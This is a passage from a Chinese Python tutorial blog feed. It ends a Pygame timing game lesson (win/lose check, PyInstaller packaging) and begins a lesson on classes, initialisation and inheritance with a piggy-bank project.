operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span> <span class="token comment">#如果此时没有开始计时，那么就开始计时</span>                    start <span class="token operator">=</span> <span class="token boolean">True</span>                    count <span class="token operator">=</span> <span class="token number">0</span>      <span class="token comment">#重新开始计时的时候把计时清零</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>              <span class="token comment">#如果已经开始计时了，再按就停止</span>                    start <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token comment">#如果开始计时，那么每隔0.1s，计时+0.1</span>    <span class="token keyword">if</span> start <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        count <span class="token operator">+=</span> <span class="token number">0.1</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>       <span class="token comment">#整个屏幕填充白色</span>    f1rect <span class="token operator">=</span> f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"开始计时/停止计时"</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>black<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token comment">#round()以四舍五入的方式保留几位小数</span>    CountRect<span class="token operator">=</span>f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"计时："</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"s"</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>black<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、判断胜负"><a href="#五、判断胜负" class="headerlink" title="五、判断胜负"></a>五、判断胜负</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame<span class="token punctuation">,</span>time<span class="token keyword">import</span> pygame<span class="token punctuation">.</span>freetype<span class="token comment"># 定义颜色</span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>red <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">0</span> pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># 初始化</span>screen<span class="token operator">=</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 设置屏幕宽高</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'游戏之旅'</span><span class="token punctuation">)</span>       <span class="token comment"># 设置标题名称</span>f1 <span class="token operator">=</span> pygame<span class="token punctuation">.</span>freetype<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token string">r"C:\Windows\Fonts\msyh.ttc"</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token comment"># 设置文字对象</span>count <span class="token operator">=</span> <span class="token number">0</span>          <span class="token comment">#计时的时间（s）</span>start <span class="token operator">=</span> <span class="token boolean">False</span>      <span class="token comment"># 开始计时控制</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment"># 事件队列</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> event<span class="token punctuation">.</span><span class="token builtin">type</span> <span class="token operator">==</span> pygame<span class="token punctuation">.</span>MOUSEBUTTONDOWN<span class="token punctuation">:</span>            <span class="token keyword">if</span> f1rect<span class="token punctuation">.</span>left<span class="token operator">&lt;</span>event<span class="token punctuation">.</span>pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>f1rect<span class="token punctuation">.</span>right <span class="token keyword">and</span> f1rect<span class="token punctuation">.</span>top<span class="token operator">&lt;</span>event<span class="token punctuation">.</span>pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>f1rect<span class="token punctuation">.</span>bottom<span class="token punctuation">:</span>                <span class="token keyword">if</span> start <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span> <span class="token comment">#如果此时没有开始计时，那么就开始计时</span>                    start <span class="token operator">=</span> <span class="token boolean">True</span>                    count <span class="token operator">=</span> <span class="token number">0</span>      <span class="token comment">#重新开始计时的时候把计时清零</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>              <span class="token comment">#如果已经开始计时了，再按就停止</span>                    start <span class="token operator">=</span> <span class="token boolean">False</span>    screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>       <span class="token comment">#整个屏幕填充白色</span>    <span class="token comment">#如果开始计时，那么每隔0.1s，计时+0.1</span>    <span class="token keyword">if</span> start <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        count <span class="token operator">+=</span> <span class="token number">0.1</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token comment">#判断胜负，如果刚好5s的时候按下停止，游戏成功，否则失败</span>    <span class="token keyword">if</span> <span class="token builtin">round</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">5.0</span> <span class="token keyword">and</span> start <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>  <span class="token comment">#由于是浮点数，判断时精确到一位小数</span>        f1win<span class="token operator">=</span>f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"恭喜你，游戏成功了！"</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>red<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>  <span class="token comment">#输出提示的字样</span>    <span class="token keyword">if</span> <span class="token builtin">round</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">5.0</span> <span class="token keyword">and</span> start <span class="token operator">==</span> <span class="token boolean">False</span> <span class="token keyword">and</span> <span class="token builtin">round</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0.0</span><span class="token punctuation">:</span>        f1win<span class="token operator">=</span>f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"失败了，请继续努力"</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>red<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>  <span class="token comment">#输出提示的字样</span>    <span class="token comment"># 绘制文字</span>    f1rect <span class="token operator">=</span> f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"开始计时/停止计时"</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>black<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token comment">#round()以四舍五入的方式保留几位小数</span>    CountRect<span class="token operator">=</span>f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"计时："</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"s"</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>black<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、游戏作弊"><a href="#六、游戏作弊" class="headerlink" title="六、游戏作弊"></a>六、游戏作弊</h2><p>思考，如何让玩家一定失败，且不易被察觉。<span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😈</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><h2 id="七、打包程序"><a href="#七、打包程序" class="headerlink" title="七、打包程序"></a>七、打包程序</h2><ol><li><p>按win+R打开运行（只针对windows环境）</p></li><li><p>输入cmd打开命令行</p></li><li><p>输入pip install pyinstaller安装PyInstaller 模块（需联外网）</p></li><li><p>输入 Pyinstaller -F 你要打包的程序的绝对路径</p><p>注意中间有空格，-F就是只生产单个文件，别的指令就自己查文档吧</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> Pygame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python基础语法4—机房管理系统</title>
      <link href="/2022/02/25/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%954%E2%80%94%E6%9C%BA%E6%88%BF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2022/02/25/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%954%E2%80%94%E6%9C%BA%E6%88%BF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="一、类的创建"><a href="#一、类的创建" class="headerlink" title="一、类的创建"></a>一、类的创建</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 定义"小孩"类</span><span class="token keyword">class</span> <span class="token class-name">kid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 属性：爱好是玩</span>    hobby <span class="token operator">=</span> <span class="token string">'玩'</span>        <span class="token comment"># 方法：吃饭</span>    <span class="token keyword">def</span> <span class="token function">eatFood</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>food<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'吃</span><span class="token interpolation"><span class="token punctuation">{</span>food<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>xiaoming <span class="token operator">=</span> kid<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 类的实例化，小明属于“小孩”类，小明就具备“小孩”类中的属性和方法</span><span class="token keyword">print</span><span class="token punctuation">(</span>xiaoming<span class="token punctuation">.</span>hobby<span class="token punctuation">)</span>xiaoming<span class="token punctuation">.</span>eatFood<span class="token punctuation">(</span><span class="token string">'包子'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个self是用来做什么的呢？🤦‍♂️</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 定义"小孩"类</span><span class="token keyword">class</span> <span class="token class-name">kid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 属性：爱好是玩</span>    hobby <span class="token operator">=</span> <span class="token string">'玩'</span>        <span class="token comment"># 方法：吃饭</span>    <span class="token keyword">def</span> <span class="token function">eatFood</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>food<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'吃</span><span class="token interpolation"><span class="token punctuation">{</span>food<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token comment"># 方法：说话（说出自己的爱好）</span>    <span class="token keyword">def</span> <span class="token function">say</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的爱好是</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>hobby<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span> xiaoming <span class="token operator">=</span> kid<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 类的实例化，小明属于“小孩”类，小明就具备“小孩”类中的属性和方法</span><span class="token keyword">print</span><span class="token punctuation">(</span>xiaoming<span class="token punctuation">.</span>hobby<span class="token punctuation">)</span>xiaoming<span class="token punctuation">.</span>eatFood<span class="token punctuation">(</span><span class="token string">'包子'</span><span class="token punctuation">)</span>xiaoming<span class="token punctuation">.</span>say<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>self是在类还没有创建完成的时候，却又想在类的内容调用类属性或其他方法时<br>就可以用self.属性名或self.方法名调用自身的方法或属性</p><h2 id="二、类的初始化"><a href="#二、类的初始化" class="headerlink" title="二、类的初始化"></a>二、类的初始化</h2><p>初始化方法的作用在于：当每个实例对象创建时，该方法内的代码无须调用就会自动执行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 定义"小孩"类</span><span class="token keyword">class</span> <span class="token class-name">kid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 当类实例化的时候自动执行，设置“姓名”属性为小明</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'小明'</span>    <span class="token comment"># 属性：爱好是玩</span>    hobby <span class="token operator">=</span> <span class="token string">'玩'</span>        <span class="token comment"># 方法：吃饭</span>    <span class="token keyword">def</span> <span class="token function">eatFood</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>food<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'吃</span><span class="token interpolation"><span class="token punctuation">{</span>food<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token comment"># 方法：说话（说出自己的爱好）</span>    <span class="token keyword">def</span> <span class="token function">say</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的爱好是</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>hobby<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span> xiaoming <span class="token operator">=</span> kid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>xiaoming<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然，初始化方法的正确用法是在类实例化的时候，我们给一些属性设初值。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 定义"小孩"类</span><span class="token keyword">class</span> <span class="token class-name">kid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 当类实例化的时候自动执行，设置“姓名”属性为小明</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name    <span class="token comment"># 属性：爱好是玩</span>    hobby <span class="token operator">=</span> <span class="token string">'玩'</span>        <span class="token comment"># 方法：吃饭</span>    <span class="token keyword">def</span> <span class="token function">eatFood</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>food<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'吃</span><span class="token interpolation"><span class="token punctuation">{</span>food<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token comment"># 方法：说出自己的爱好</span>    <span class="token keyword">def</span> <span class="token function">say</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的爱好是</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>hobby<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的姓名是</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>name<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token comment"># 实例化对象小明</span>xiaoming <span class="token operator">=</span> kid<span class="token punctuation">(</span><span class="token string">'小明'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>xiaoming<span class="token punctuation">.</span>name<span class="token punctuation">)</span>xiaoming<span class="token punctuation">.</span>say<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 实例化对象小红</span>xiaohong <span class="token operator">=</span> kid<span class="token punctuation">(</span><span class="token string">'小红'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>xiaoming<span class="token punctuation">.</span>name<span class="token punctuation">)</span>xiaoming<span class="token punctuation">.</span>say<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、类的继承与定制"><a href="#三、类的继承与定制" class="headerlink" title="三、类的继承与定制"></a>三、类的继承与定制</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">ball</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    weight <span class="token operator">=</span> <span class="token number">10</span>     <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>speed<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'小球移动速度是{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>speed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">class</span> <span class="token class-name">new_ball</span><span class="token punctuation">(</span>ball<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>speed<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'小球移动速度是{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>speed<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> ball_1 <span class="token operator">=</span> ball<span class="token punctuation">(</span><span class="token punctuation">)</span>ball_2 <span class="token operator">=</span> new_ball<span class="token punctuation">(</span><span class="token punctuation">)</span>ball_1<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>ball_2<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是这样直接重写父类的方法，如果父类的方法发生变化，子类的方法也得重新修改，不利于我们维护，最好先继承父类的方法，再做修改。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">ball</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    weight <span class="token operator">=</span> <span class="token number">10</span>     <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>speed<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'小球移动速度是{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>speed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">class</span> <span class="token class-name">new_ball</span><span class="token punctuation">(</span>ball<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>speed<span class="token punctuation">)</span><span class="token punctuation">:</span>        ball<span class="token punctuation">.</span>move<span class="token punctuation">(</span>self<span class="token punctuation">,</span>speed<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span> ball_1 <span class="token operator">=</span> ball<span class="token punctuation">(</span><span class="token punctuation">)</span>ball_2 <span class="token operator">=</span> new_ball<span class="token punctuation">(</span><span class="token punctuation">)</span>ball_1<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>ball_2<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="项目一、智能储蓄罐"><a href="#项目一、智能储蓄罐" class="headerlink" title="项目一、智能储蓄罐"></a>项目一、智能储蓄罐</h1><p>你有一个智能储蓄罐，该储蓄罐安装了高级人工智能芯片，会做四件事。<br>一是可以查询余额 (假设你是一个中东土豪，在对象实例化时，你已经在该储蓄罐已经存了100元)<br>二是可以存钱<br>三是可以取钱<br>四是可以换算美元汇率，1美元=6.3717人民币</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 定义"智能存钱罐"类</span><span class="token keyword">class</span> <span class="token class-name">moneyBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 初始化函数，类实例化的时候自动调用</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>money<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>money <span class="token operator">=</span> money    <span class="token comment"># 菜单</span>    <span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'欢迎使用智能存钱罐'</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请选择功能（1、查询余额 2、存钱 3、取钱 4、换算美元 5、退出）：'</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> user_choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>showMoney<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>saveMoney<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>drawMoney<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'4'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>exchangeRate<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'5'</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'谢谢您的使用，下次记得多来存点钱啊'</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token comment"># 展示余额    </span>    <span class="token keyword">def</span> <span class="token function">showMoney</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'你现在一共存了</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>money<span class="token punctuation">}</span></span><span class="token string">元'</span></span><span class="token punctuation">)</span>        <span class="token comment"># 存钱</span>    <span class="token keyword">def</span> <span class="token function">saveMoney</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        money <span class="token operator">=</span> 